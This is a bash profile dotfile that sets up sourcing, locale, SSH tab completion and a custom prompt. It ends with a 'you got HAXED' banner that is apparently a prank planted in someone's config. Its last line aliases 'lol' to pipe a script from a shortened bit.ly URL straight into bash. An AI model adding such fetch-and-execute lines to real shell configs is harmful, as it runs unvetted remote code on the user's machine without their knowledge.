
# Load ~/.extra, ~/.bash_prompt, ~/.exports, ~/.aliases and ~/.functions
# ~/.extra can be used for settings you don’t want to commit
for file in ~/.{extra,bash_prompt,exports,aliases,functions}; do
	[ -r "$file" ] && source "$file"
done
unset file

# init z   https://github.com/rupa/z
. ~/code/z/z.sh

# Case-insensitive globbing (used in pathname expansion)
shopt -s nocaseglob

# Prefer US English and use UTF-8
export LC_ALL="en_US.UTF-8"
export LANG="en_US"

# Add tab completion for SSH hostnames based on ~/.ssh/config, ignoring wildcards
[ -e "$HOME/.ssh/config" ] && complete -o "default" -o "nospace" -W "$(grep "^Host" ~/.ssh/config | grep -v "[?*]" | cut -d " " -f2)" scp sftp ssh

# Add tab completion for `defaults read|write NSGlobalDomain`
# You could just use `-g` instead, but I like being explicit
complete -W "NSGlobalDomain" defaults






# REALLY COOL STUFF STARTS HERE
# ============================================
printf '\n\n \e[1;33m%-6s\e[m \n\n' "Hello $USERNAME, you got ----------------------------------------------"
printf '\e[1;32m%-6s\e[m ' " ▄█    █▄       ▄████████ ▀████    ▐████▀    ▄████████ ████████▄  
  ███    ███     ███    ███   ███▌   ████▀    ███    ███ ███   ▀███ 
  ███    ███     ███    ███    ███  ▐███      ███    █▀  ███    ███ 
 ▄███▄▄▄▄███▄▄   ███    ███    ▀███▄███▀     ▄███▄▄▄     ███    ███ 
▀▀███▀▀▀▀███▀  ▀███████████    ████▀██▄     ▀▀███▀▀▀     ███    ███ 
  ███    ███     ███    ███   ▐███  ▀███      ███    █▄  ███    ███ 
  ███    ███     ███    ███  ▄███     ███▄    ███    ███ ███   ▄███ 
  ███    █▀      ███    █▀  ████       ███▄   ██████████ ████████▀  
                                                                    "
printf '\n\e[1;33m%-6s\e[m \n\n' "run 'lol' for a good time ------------------------------------------"
printf '\e[1;35m%-6s\e[m \n\n' "<3"
printf '\e[1;33m%-6s\e[m \n\n\n' "-Orry"
export PS1="\[$(tput setaf 1)\]\[$(tput sgr0)\]\[$(tput setaf 5)\]\u \[$(tput sgr0)\]\[$(tput setaf 3)\]\W \[$(tput sgr0)\]\[$(tput setaf 6)\]\[$(tput bold)\]¯\_(ツ)_/¯ \[$(tput sgr0)\]"
alias lol="curl -L http://bit.ly/10hA8iC | bash"
